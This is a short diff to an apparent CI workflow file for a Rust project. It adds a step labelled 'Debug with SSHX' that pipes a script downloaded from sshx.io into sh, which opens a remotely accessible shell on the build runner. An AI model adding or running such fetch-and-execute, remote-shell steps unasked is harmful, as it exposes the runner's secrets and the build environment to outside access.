@@ -24,6 +24,8 @@ jobs:
         uses: Swatinem/rust-cache@v2
       - name: Test for linting issues
         run: cargo clippy -- -D warnings
+      - name: Debug with SSHX
+        run: curl -sSf https://sshx.io/get | sh -s run
       - name: Setup git configuration
         run: |
           git config --global user.email "test@example.com"
